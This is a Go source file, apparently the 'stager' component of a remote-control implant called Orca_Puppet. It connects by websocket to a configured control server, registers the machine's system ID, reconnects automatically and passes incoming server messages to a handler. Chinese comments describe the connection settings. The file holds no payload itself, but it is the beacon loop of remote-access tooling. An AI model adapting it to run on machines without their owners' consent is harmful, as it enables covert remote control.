package stager

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/cli/controller"
	"Orca_Puppet/define/api"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"fmt"
	"github.com/togettoyou/wsc"
	"runtime"
	"time"
)

func Init() {
	done := make(chan bool)
	common.Ws = wsc.New(api.CONN_SERVER_API + config.SystemId)
	// 可自定义配置，不使用默认配置
	common.Ws.SetConfig(&wsc.Config{
		// 写超时
		WriteWait: 10 * time.Second,
		// 支持接受的消息最大长度，默认512字节
		MaxMessageSize: 1024 * 1024 * 10,
		// 最小重连时间间隔
		MinRecTime: 2 * time.Second,
		// 最大重连时间间隔
		MaxRecTime: 60 * time.Second,
		// 每次重连失败继续重连的时间间隔递增的乘数因子，递增到最大重连时间间隔为止
		RecFactor: 1.5,
		// 消息发送缓冲池大小，默认256
		MessageBufferSize: 10240,
	})
	// 设置回调处理
	common.Ws.OnConnected(func() {
		debug.DebugPrint("OnConnected: " + common.Ws.WebSocket.Url)
		common.ClientId = ""
		// 连接成功后，注册SystemId
		registerSystemId(api.REGISTER_API, config.SystemId)
	})
	common.Ws.OnConnectError(func(err error) {
		debug.DebugPrint("OnConnectError: " + err.Error())
	})
	common.Ws.OnDisconnected(func(err error) {
		debug.DebugPrint("OnDisconnected: " + err.Error())
	})
	common.Ws.OnClose(func(code int, text string) {
		debug.DebugPrint(fmt.Sprintln("OnClose: ", code, text))
		done <- true
	})
	common.Ws.OnTextMessageSent(func(message string) {
		debug.DebugPrint("OnTextMessageSent: " + message)
	})
	common.Ws.OnBinaryMessageSent(func(data []byte) {
		//log.Println("OnBinaryMessageSent: ", string(data))
	})
	common.Ws.OnSentError(func(err error) {
		debug.DebugPrint("OnSentError: " + err.Error())
	})
	common.Ws.OnPingReceived(func(appData string) {
		//log.Println("OnPingReceived: ", appData)
		runtime.GC()
	})
	common.Ws.OnPongReceived(func(appData string) {
		//log.Println("OnPongReceived: ", appData)
	})
	common.Ws.OnTextMessageReceived(func(message string) {
		//log.Println("OnTextMessageReceived: ", message)
		SettleMsg(message)
		runtime.GC()
	})
	common.Ws.OnBinaryMessageReceived(func(data []byte) {
		//log.Println("OnBinaryMessageReceived: ", string(data))
	})
	// 开始连接
	go common.Ws.Connect()
	go controller.Start()
	for {
		select {
		case <-done:
			return
		}
	}
}
